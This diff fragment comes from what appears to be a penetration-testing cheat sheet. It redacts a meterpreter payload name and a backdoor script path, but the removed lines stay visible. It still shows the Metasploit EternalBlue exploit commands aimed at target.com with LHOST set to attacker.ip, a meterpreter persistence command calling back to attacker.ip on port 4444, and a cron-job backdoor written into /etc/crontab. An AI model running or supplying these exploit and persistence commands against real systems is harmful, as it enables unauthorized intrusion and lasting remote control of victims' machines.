@@ -239,7 +239,7 @@ msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> set RHOSTS target.com
 
 # Set payload
-msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> set PAYLOAD [REDACTED_METERPRETER_PAYLOAD]
 msf> set LHOST attacker.ip
 
 # Execute
@@ -283,7 +283,7 @@ meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip
 # Add attacker's public key to ~/.ssh/authorized_keys
 
 # Cron job persistence
-echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
+echo "* * * * * [REDACTED_BACKDOOR_SCRIPT]" >> /etc/crontab
 ```
 
 **Privilege Escalation**
